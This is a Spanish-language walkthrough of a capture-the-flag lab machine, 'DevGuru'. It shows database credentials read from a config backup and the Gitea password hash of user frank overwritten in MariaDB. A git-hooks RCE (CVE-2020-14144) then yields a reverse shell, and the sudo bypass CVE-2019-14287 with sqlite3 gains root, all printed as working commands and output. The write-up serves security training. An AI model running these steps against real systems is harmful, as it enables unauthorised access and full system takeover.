ACCESS_LOG_TEMPLATE  = {{.Ctx.RemoteAddr}} - {{.Identity}} {{.Start.Format "[02/Jan/2006:15:04:05 -0700]" }} "{{.Ctx.Req.Method}} {{.Ctx.Req.RequestURI}} {{.Ctx.Req.Proto}}" {{.ResponseWriter.Status}} {{.ResponseWriter.Size}} "{{.Ctx.Req.Referer}}\" \"{{.Ctx.Req.UserAgent}}"
; Mailer user name and password
USER      = 
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD    = 
; Synchronize external user data (only LDAP user synchronization is supported)
[cron.sync_external_users]
; Synchronize external user data when starting server (default false)
; Create new users, update existing user data and disable users that are not in external source anymore (default)
; or only create new users if UPDATE_EXISTING is set to false
; Don't pass the file on STDIN, pass the filename as argument instead.
; If there is a password of redis, use `addrs=127.0.0.1:6379 password=123 db=0`.
www-data@devguru:/var/www/html$
```

De los resultados obtenidos, vemos una credenciales de acceso a la base de datos:

```bash
www-data@devguru:/var/www/html$ grep -B 10 "UfFPTF8C8jjxVF2m" /var/backups/app.ini.bak
; set to 1024 to switch on
DSA     = -1

[database]
; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = UfFPTF8C8jjxVF2m
```

Asi que vamos a guardarlas y tratar de acceder a la base de datos con las credenciales que obtuvimos:

```bash
www-data@devguru:/var/www/html$ mysql -u gitea -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 671
Server version: 10.1.47-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Vamos a echarle un ojo si encontramos algo interesante y poder migra al usuario **frank** o convertirnos en **root**.

```bash
riaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use gitea;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gitea]> show tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| attachment                |
| collaboration             |
| comment                   |
| commit_status             |
| deleted_branch            |
| deploy_key                |
| email_address             |
| email_hash                |
| external_login_user       |
| follow                    |
| gpg_key                   |
| gpg_key_import            |
| hook_task                 |
| issue                     |
| issue_assignees           |
| issue_dependency          |
| issue_label               |
| issue_user                |
| issue_watch               |
| label                     |
| language_stat             |
| lfs_lock                  |
| lfs_meta_object           |
| login_source              |
| milestone                 |
| mirror                    |
| notice                    |
| notification              |
| oauth2_application        |
| oauth2_authorization_code |
| oauth2_grant              |
| oauth2_session            |
| org_user                  |
| protected_branch          |
| public_key                |
| pull_request              |
| reaction                  |
| release                   |
| repo_indexer_status       |
| repo_redirect             |
| repo_topic                |
| repo_unit                 |
| repository                |
| review                    |
| star                      |
| stopwatch                 |
| task                      |
| team                      |
| team_repo                 |
| team_unit                 |
| team_user                 |
| topic                     |
| tracked_time              |
| two_factor                |
| u2f_registration          |
| upload                    |
| user                      |
| user_open_id              |
| version                   |
| watch                     |
| webhook                   |
+---------------------------+
64 rows in set (0.00 sec)

MariaDB [gitea]>
MariaDB [gitea]> select * from user;
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
| id | lower_name | name  | full_name | email               | keep_email_private | email_notifications_preference | passwd                                                                                               | passwd_hash_algo | must_change_password | login_type | login_source | login_name | type | location | website | rands      | salt       | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login | avatar                           | avatar_email        | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style | theme |
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
|  1 | frank      | frank |           | frank@devguru.local |                  0 | enabled                        | c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900 | pbkdf2           |                    0 |          0 |            0 |            |    0 |          |         | XueBH0eT2Y | Bop8nwtUiM | en-US    |             |   1605832197 |   1605841809 |      1605841809 |                    1 |                -1 |         1 |        1 |             0 |              0 |                  0 |                         1 |              0 | 13d0a7d733ae3042a5af559bddea54b3 | frank@devguru.local |                 1 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | gitea |
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
1 row in set (0.00 sec)

MariaDB [gitea]>
```

Encontramos unas credenciales de acceso del usuario **frank**, lo más seguro que al repositorio debido a que la base de datos se llama **Gitea**. De forma similar, podemos crearnos una contraseña con el algoritmo **pbkdf2** y cambiar la del usuario **frank**:

![](/assets/images/vh-devguru/devguru6.png)

```bash
MariaDB [gitea]> update user set passwd='$2a$10$TA/m1nQZUL2SwwmhxUaDgOZ/KP5.tAvlnhocNiHa0m1SDDpiI5nzi',passwd_hash_algo='bcrypt' where name='frank';
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [gitea]> select * from user;
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+--------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+--------------
--------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
| id | lower_name | name  | full_name | email               | keep_email_private | email_notifications_preference | passwd                                                       | passwd_hash_algo | must_change_password | login_type | login_source | login_name | type | location | website | rands      | salt       | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login | avatar                           | avatar_email        | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style | theme |
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+--------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
|  1 | frank      | frank |           | frank@devguru.local |                  0 | enabled                        | $2a$10$TA/m1nQZUL2SwwmhxUaDgOZ/KP5.tAvlnhocNiHa0m1SDDpiI5nzi | bcrypt           |                    0 |          0 |            0 |            |    0 |          |         | XueBH0eT2Y | Bop8nwtUiM | en-US    |             |   1605832197 |   1605841809 |      1605841809 |                    1 |                -1 |         1 |        1 |             0 |              0 |                  0 |                         1 |              0 | 13d0a7d733ae3042a5af559bddea54b3 | frank@devguru.local |                 1 |             0 |             0 |         0 |         1 |         0 |           0 |          0 |                             0 |                 | gitea |
+----+------------+-------+-----------+---------------------+--------------------+--------------------------------+--------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+------------+------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+---------------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+
1 row in set (0.00 sec)

MariaDB [gitea]>
```

Ahora tratremos de acceder al repositorio con las credenciales **frank : admin123**:

![](/assets/images/vh-devguru/devguru16.png)

![](/assets/images/vh-devguru/devguru17.png)

Ya nos encontramos dentro del repositorio como el usuario **frank**; ahora debemos tratar de buscar una forma de entablarnos una reverse shell para acceder a la máquina nuevamente pero ahora como el usuario **frank**. Encontramos el repo [CVE-2020-14144-GiTea-git-hooks-rce](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce) en donde nos indica como podemos realizar lo que buscamos, por lo tanto:

![](/assets/images/vh-devguru/devguru18.png)

![](/assets/images/vh-devguru/devguru19.png)

Editamos el archivo `README.md` para se pueda realizar un push y nos entable la reverse shell.

![](/assets/images/vh-devguru/devguru20.png)

```bash
❯ nc -nlvp 8443
listening on [any] 8443 ...
connect to [10.0.0.75] from (UNKNOWN) [10.0.0.96] 52452
bash: cannot set terminal process group (931): Inappropriate ioctl for device
bash: no job control in this shell
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ whoami
whoami
frank
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ 
```

Como siempre, hacemos un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar más cómodos y no matemos la shell por errror. Ya somos el usuario **frank** y podemos visualizar la primer flag (user.txt). Vamos a enumerar un poco el sistema para encontrar una forma de escalar privilegios:

```bash
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo -l
Matching Defaults entries for frank on devguru:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on devguru:
    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ 
```

Vemos que podemos ejecutar el binario `/usr/bin/sqlite3` como cualquier usuario, menos como **root**; sin embargo, vamos a validar la versión del binario `sudo`:

```bash
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
frank@devguru:~/gitea-repositories/frank/devguru-website.git$
```

Debido a la versión utilizada, podemos utilizar el CVE CVE-2019-14287 en combinación con la explotación del binario `sqlite3` mediante la página de [GTFOBins](https://gtfobins.github.io/):

```bash
frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).